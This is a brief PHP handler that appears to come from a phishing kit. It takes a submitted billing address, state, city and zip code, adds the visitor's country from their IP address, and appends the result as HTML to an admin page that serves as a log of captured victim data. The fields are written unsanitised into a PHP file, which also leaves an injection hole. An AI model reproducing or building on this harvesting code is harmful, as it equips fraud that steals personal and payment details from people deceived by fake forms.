<?php
sleep(1);
session_start();

require 'functions.php';
 
if(isset($_POST['address'])){

$billingHtml = "
<div class='result-box'>
<div class='title'>Billing Address</div><br>
<b>COUNTRY : </b> "._getCountry_(_ip())."<br>
<b>ADDRESS: </b> "._getData('address')."<br>
<b>STATE:</b> "._getData('state')."<br>
<b>CITY :</b> "._getData('city')." <br>
<b>ZIP : </b> "._getData('zip')."
</div>"; 

$_SESSION['billing'] = $billingHtml;

$fp = fopen("../admin/index.php","a");
fwrite($fp, $billingHtml);
fclose($fp);
exit();
}

?>